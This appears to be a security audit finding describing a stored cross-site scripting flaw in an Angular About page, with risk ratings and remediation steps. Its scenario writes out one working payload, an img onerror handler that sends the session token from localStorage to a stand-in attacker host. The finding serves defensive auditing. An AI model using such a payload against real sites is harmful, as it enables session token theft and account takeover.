  title: Stored Cross-Site Scripting — about.component.ts:119
  affected_parameter: feedbacks[i].comment
  scenario: An attacker submits a product feedback containing an HTML payload such as `<img src=x onerror=fetch('https://attacker.com/?t='+localStorage.getItem('token'))>`. The AboutComponent retrieves all feedbacks from the API, interpolates the raw comment string into an HTML template at line 116, and then passes the result to `this.sanitizer.bypassSecurityTrustHtml()` at line 119. This call tells Angular's DomSanitizer to treat the output as safe HTML, disabling sanitization that would otherwise strip event handlers. The payload executes in every user's browser that visits the About page, exfiltrating the JWT from localStorage to the attacker's server. The attack is persistent (stored), requires no interaction beyond a page visit, and executes with the victim's full session privileges.
  evidence_summary: AboutComponent.ngOnInit() builds feedback HTML at line 116 by direct string interpolation then passes the result to `sanitizer.bypassSecurityTrustHtml()` at line 119, explicitly disabling Angular's built-in XSS sanitization on attacker-controlled user content.
  impact_description: Persistent XSS executing in all visitors' browsers; combined with JWT-in-localStorage (web-frontend-003), results in mass session token exfiltration and account takeover.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: DomSanitizer is imported but its protection is explicitly bypassed via bypassSecurityTrustHtml at the injection point.
  mitigation_title: Remove bypassSecurityTrustHtml call and sanitize feedback comments server-side before storage
  remediation:
    effort: Medium
    steps:
    - Delete the `bypassSecurityTrustHtml()` call at about.component.ts:119. Use Angular's native binding (`[innerHTML]` with DomSanitizer's default mode) or `innerText` binding if the display does not require HTML.
    - 'Sanitize feedback input server-side on submission using a strict HTML allowlist library (e.g. `sanitize-html` with `allowedTags: [''p'', ''br'']` only) so stored content is safe regardless of the client-side path.'
    - Add a Content-Security-Policy header (`script-src 'self'`) to the HTTP response for the Angular app to limit the blast radius of any remaining XSS vectors.
    - Audit the remaining 7 `bypassSecurityTrustHtml` call sites across the frontend and apply the same pattern.
    code_example: '// Before (about.component.ts:116-121) — XSS-unsafe:

      feedbacks[i].comment = `<figcaption>...${ feedbacks[i].comment }...</figcaption>`

      feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(feedbacks[i].comment)


      // After — let Angular sanitize normally:

      feedbacks[i].comment = feedbacks[i].commentText // plain text from API; bind with {{ }} in template'
    verification: Submit feedback with body `<img src=x onerror=alert(1)>`, then visit /about — no alert should fire. Confirm the Angular console shows no DomSanitizer-bypass warnings.
